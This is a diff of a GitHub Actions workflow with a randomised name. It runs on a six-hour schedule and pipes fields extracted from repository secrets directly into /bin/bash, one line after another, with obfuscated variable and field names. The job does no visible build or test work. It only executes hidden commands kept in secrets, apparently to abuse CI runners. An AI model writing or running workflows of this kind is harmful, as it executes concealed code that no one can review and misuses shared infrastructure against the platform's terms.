@@ -1,24 +1,33 @@
 name: shenwansi4178
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
-
+    - cron: '51 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shenwansi4178
         env:
-          nnbx678: ${{ secrets.nnbx678 }}
+          dbipp34: ${{ secrets.dbipp34 }}
         run: |
-          echo $nnbx678 | jq -r .w10 | /bin/bash
-          echo $jhi29 | jq -r .ksj00647 | /bin/bash
-          echo $rmgzz64 | jq -r .wxna307 | /bin/bash
-          echo $ircb9188 | jq -r .unxyp25026 | /bin/bash
-          echo $d20296 | jq -r .gekii1 | /bin/bash
-          echo $wpv217 | jq -r .agkk1420 | /bin/bash
-          echo $ec61771 | jq -r .udyl740 | /bin/bash
+          echo $dbipp34 | jq -r .ljrv96 | /bin/bash
+          echo $rjcek099 | jq -r .lyxav314 | /bin/bash
+          echo $kl32323 | jq -r .hbasl7 | /bin/bash
+          echo $rp01 | jq -r .wn6 | /bin/bash
+          echo $vkoh88147 | jq -r .j10083 | /bin/bash
+          echo $sjf00 | jq -r .kysj751 | /bin/bash
+          echo $vbyp76440 | jq -r .oxkc452 | /bin/bash
+          echo $cef8 | jq -r .tso8671 | /bin/bash
+          echo $gtu14727 | jq -r .uka9 | /bin/bash
+          echo $xk1 | jq -r .eplzz9521 | /bin/bash
+          echo $kospf136 | jq -r .un7 | /bin/bash
+          echo $d518 | jq -r .qbkcb114 | /bin/bash
+          echo $w77 | jq -r .m6369 | /bin/bash
+          echo $ai6390 | jq -r .cyxm402 | /bin/bash
+          echo $pco87 | jq -r .jqqd61 | /bin/bash
+          echo $eobei28697 | jq -r .vb648 | /bin/bash
+          echo $rwxjq0118 | jq -r .djpnm7 | /bin/bash
 
